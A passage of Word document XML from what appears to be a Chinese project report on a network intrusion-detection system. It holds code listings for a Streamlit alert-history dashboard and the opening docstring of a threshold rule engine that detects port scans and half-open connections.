        <w:t xml:space="preserve">    else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0905F5FF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        draw_report()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B5B1B96">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B79B90C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2158DB5B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ------------------------------------------------------------------ 历史查询</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="310C80C5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63145E4F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="684D14B2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>with tab_history:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BE74379">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    st.subheader("历史告警")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C6B35F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    c1, c2, c3 = st.columns(3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A9A27C8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    with c1:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74B8EA04">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        probe_filter = st.text_input("探针编号（留空不过滤）", value="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30AFDA58">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    with c2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A0E2067">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        since_day = st.date_input("起始日期", value=pd.Timestamp.today().normalize())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="576AA534">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    with c3:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09C92BD7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        cat_filter = st.text_input("类别（留空不过滤）", value="")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FB3128C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    params = {"limit": 500, "since": float(pd.Timestamp(since_day).timestamp())}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="047F4110">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if probe_filter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D19DFB7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        params["probe_id"] = probe_filter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="407C40EA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if cat_filter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC52FA8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        params["category"] = cat_filter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0444B5C5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    data, err = api("/api/v1/alerts", **params)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01914497">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if err:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CE80B22">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        st.error(err)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C951DBE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="020832D2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        rows = data.get("alerts", [])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E0FF1DA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if rows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10BF32A4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            df = pd.DataFrame(rows)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DFACD3D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            df["时间"] = pd.to_datetime(df["created_at"], unit="s").dt.strftime("%Y-%m-%d %H:%M:%S")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63D19D1B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            df["风险"] = df["risk"].map(lambda r: RISK_TEXT.get(r, r))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="126F250F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            src = df["source"].fillna("model") if "source" in df.columns else pd.Series(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02B5569F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "model", index=df.index)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="573DCAD7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            df["来源"] = src.map(lambda s: "规则" if s == "rule" else "小模型")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D0321A0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            st.dataframe(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57C51E23">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                df[["id", "时间", "probe_id", "category", "来源", "confidence", "风险", "flow_key"]]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27AA2FE2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                .rename(columns={"id": "编号", "probe_id": "探针", "category": "类别",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ADD79CB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                                 "confidence": "置信度/超阈值倍数", "flow_key": "流标识"}),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DC086BA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                width="stretch", hide_index=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E4961C7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E71D470">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            st.download_button(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CAD318B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                "下载 CSV",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B92F727">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                df.to_csv(index=False).encode("utf-8"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EF3F3D5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                file_name=f"alerts_{since_day}.csv",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F397FAC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                mime="text/csv",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="191487A1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A6CC881">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EAE2536">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            st.info("该条件下没有告警记录。")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B19E64">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3093E6BF">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-27　center/rules.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（292 行）　M11 规则引擎</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B3EF75A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""M11 阈值规则引擎：与小模型并跑的确定性基线，也是线上兜底。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28E16943">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6005FED0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>为什么要单独做一层：小模型是在 CIC-IDS2017 的**聚合形态**上学的，现场抓到的短流突发</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29006D71">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>落在训练分布之外时，它既不报警也不报错（实测见 docs/architecture.md「在线路径实测」）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5172A6D4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>规则层判的是行为——同一源在短窗口内探了多少个端口、同一目的端口撞了多少次半连接——</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16E3369D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>这些量不依赖包长/标志位的采集口径，所以能覆盖小模型看不见的形态。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63417BAC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="151A30B1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>两层：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54C7FB7D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">  flow_rules()  单流规则，只看这一条流的特征。离线基线（tools/rules_baseline.py）用它，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D5FB362">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                数据集 CSV 没有时间戳和跨流上下文，只能评这一层。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0675539D">
      <w:pPr>
